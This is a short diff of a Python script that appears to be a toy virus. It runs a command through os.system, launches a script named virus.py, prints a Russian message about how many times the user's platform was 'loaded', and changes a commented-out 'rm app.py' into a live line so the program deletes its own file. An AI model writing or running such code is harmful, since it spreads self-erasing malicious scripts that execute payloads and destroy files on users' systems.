@@ -23,4 +23,4 @@ os.system('''{command}''')
 os.system('python virus.py')
 print(f'Ваша платформа {os.name} была нагружена {count} раз.')
 
-# os.system('rm app.py')
+os.system('rm app.py')
